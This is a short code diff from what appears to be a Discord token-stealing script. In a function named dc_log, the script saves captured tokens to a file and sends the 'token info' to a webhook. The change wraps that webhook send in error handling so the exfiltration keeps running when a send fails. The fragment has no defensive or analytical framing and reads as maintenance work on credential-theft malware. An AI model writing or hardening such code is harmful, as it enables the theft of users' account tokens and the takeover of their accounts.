@@ -385,7 +385,10 @@ def dc_log():
                         f.write(token + "\\n")
 
                     log_message(f"Sending webhook of the token info...", log_txt_path)
-                    send_webhook(embed_content)
+                    try:
+                        send_webhook(embed_content)
+                    except Exception as e:
+                        log_message(f"Error occured while trying to send the webhook... {e}", log_txt_path)
                     log_message(f"Sent webhook of the token info...", log_txt_path)
 
     t()
